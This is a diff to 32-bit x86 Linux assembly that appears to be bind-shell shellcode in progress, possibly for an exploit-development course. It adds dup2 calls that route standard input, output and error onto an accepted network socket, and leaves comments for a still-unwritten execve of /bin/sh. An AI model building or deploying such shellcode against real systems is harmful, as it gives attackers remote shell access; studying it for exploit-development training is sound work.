@@ -63,18 +63,33 @@ _start:
     xor edx, edx    ; addrlen = NULL
     int 0x80
     
-    ; temporarily stick accepted socket fd into exit return code 
-    ;  for testing
+    ; pass connected fd as first arg of next syscall
     mov ebx, eax
 
 	; 63 dup2(conn_fd, 0-2)
+    xor eax, eax
+    mov ax, 63      ; 63 = dup2
+    ; conn_fd already in ebx from line 67
+    ; ecx is already 0 from previous syscall
+    int 0x80
+    
+    mov ax, 63      ; 63 = dup2
+    inc ecx         ; STDIN --> STDOUT
+    int 0x80
+
+    mov ax, 63      ; 63 = dup2
+    inc ecx         ; STDOUT --> STDERR
+    int 0x80 
 
 	; 11 execve("/bin/sh", NULL, NULL)
-
+    ; "\0hs/" --> some number
+    ; "nib/"  --> some number
 	; cleanup code...
+
+    ; close conn_fd
 	
     ; clean exit
 	xor eax, eax    
     inc al          ; 1 = exit
-    ;xor ebx, ebx    ; 0 = return SUCCESS
+    xor ebx, ebx    ; 0 = return SUCCESS
     int 0x80
